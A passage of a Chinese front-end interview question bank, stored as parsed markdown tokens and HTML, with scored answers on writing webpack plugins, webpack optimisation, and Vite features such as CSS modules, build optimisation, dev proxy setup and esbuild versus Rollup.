loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack中的Plugin如何编写？\\n\\n","depth":2,"text":"webpack中的Plugin如何编写？","tokens":[{"type":"text","raw":"webpack中的Plugin如何编写？","text":"webpack中的Plugin如何编写？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:\\n- compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子\\n- compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:\\n- 插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.\\n- 传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改\\n- 异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:\\n","task":false,"loose":false,"text":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:","tokens":[{"type":"text","raw":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\n\\nwebpack 编译会创建两个核心对象:","text":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务","text":" 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"webpack 编译会创建两个核心对象:","text":"webpack 编译会创建两个核心对象:","escaped":false}]}]},{"type":"list_item","raw":"- compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子\\n","task":false,"loose":false,"text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","tokens":[{"type":"text","raw":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","tokens":[{"type":"text","raw":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","escaped":false}]}]},{"type":"list_item","raw":"- compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:\\n","task":false,"loose":false,"text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","tokens":[{"type":"text","raw":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n\\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","tokens":[{"type":"text","raw":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation","text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","text":"将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","escaped":false}]}]},{"type":"list_item","raw":"- 插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.\\n","task":false,"loose":false,"text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","tokens":[{"type":"text","raw":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","tokens":[{"type":"text","raw":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","escaped":false}]}]},{"type":"list_item","raw":"- 传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改\\n","task":false,"loose":false,"text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","tokens":[{"type":"text","raw":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","tokens":[{"type":"text","raw":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","escaped":false}]}]},{"type":"list_item","raw":"- 异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","task":false,"loose":false,"text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","tokens":[{"type":"text","raw":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","tokens":[{"type":"text","raw":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nclass MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(\\"MyPlugin\\", (compilation) => {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}\\n```","lang":"javascript","text":"class MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(\\"MyPlugin\\", (compilation) => {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 说说如何借助webpack来优化前端性能?\\n\\n","depth":2,"text":"说说如何借助webpack来优化前端性能?","tokens":[{"type":"text","raw":"说说如何借助webpack来优化前端性能?","text":"说说如何借助webpack来优化前端性能?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`w3`,`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`w3`,`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`w3`","text":"w3"},{"type":"text","raw":",","text":",","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **3：**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **3：**","task":false,"loose":false,"text":"**3：**","tokens":[{"type":"text","raw":"**3：**","text":"**3：**","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >JS代码压缩  \\n >CSS代码压缩  \\n >Html文件代码压缩  \\n >文件大小压缩  \\n >图片压缩  \\n >Tree Shaking  \\n >代码分离  \\n >内联 chunk","tokens":[{"type":"paragraph","raw":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk","text":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk","tokens":[{"type":"text","raw":"JS代码压缩","text":"JS代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"CSS代码压缩","text":"CSS代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Html文件代码压缩","text":"Html文件代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"文件大小压缩","text":"文件大小压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"图片压缩","text":"图片压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Tree Shaking","text":"Tree Shaking","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"代码分离","text":"代码分离","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"内联 chunk","text":"内联 chunk","escaped":false}]}],"text":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk"}]},{"key":"vite","content":"<h1>vite</h1>\\n<h2>Vite 如何处理 CSS 模块？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。</li>\\n</ul>\\n<h2>Vite 生产构建的主要优化策略有哪些？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。</li>\\n<li><strong>1：</strong> 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function add(a, b) {\\n    return a + b;\\n}\\n</code></pre>\\n<p>经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。</p>\\n<ul>\\n<li><p><strong>1：</strong> CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。</p>\\n</li>\\n<li><p><strong>1：</strong> 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。</p>\\n</li>\\n<li><p><strong>2：</strong> Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 vite.config.js 中配置 server.proxy 选项，例如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">module.exports = {\\n  server: {\\n    proxy: {\\n      &#39;/api&#39;: {\\n        target: &#39;http://backend-api-url&#39;,\\n        changeOrigin: true,\\n        rewrite: (path) =&gt; path.replace(/^\\\\/api/, &#39;&#39;)\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。\\n</code></pre>\\n<h2>Vite 在开发模式下如何实现快速启动？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。</li>\\n</ul>\\n<h2>Vite 如何支持 TypeScript？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。</li>\\n</ul>\\n<h2>Vite 与传统的 Webpack 打包工具有何不同？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。</li>\\n</ul>\\n<h2>Vite 项目构建速度快的原因是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。</li>\\n</ul>\\n<h2>esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。</p>\\n</li>\\n<li><p><strong>1：</strong> Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。</p>\\n</li>\\n<li><p><strong>1：</strong> 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# vite\\n\\n","depth":1,"text":"vite","tokens":[{"type":"text","raw":"vite","text":"vite","escaped":false}]},{"type":"heading","raw":"## Vite 如何处理 CSS 模块？\\n\\n","depth":2,"text":"Vite 如何处理 CSS 模块？","tokens":[{"type":"text","raw":"Vite 如何处理 CSS 模块？","text":"Vite 如何处理 CSS 模块？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","task":false,"loose":false,"text":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","tokens":[{"type":"text","raw":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","text":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","text":" Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 生产构建的主要优化策略有哪些？\\n\\n","depth":2,"text":"Vite 生产构建的主要优化策略有哪些？","tokens":[{"type":"text","raw":"Vite 生产构建的主要优化策略有哪些？","text":"Vite 生产构建的主要优化策略有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。\\n- **1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。\\n","task":false,"loose":false,"text":"**1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","tokens":[{"type":"text","raw":"**1：** 依赖预打包<br>\\n\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","text":"**1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 依赖预打包","text":" 依赖预打包","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。","text":"\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","text":"\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 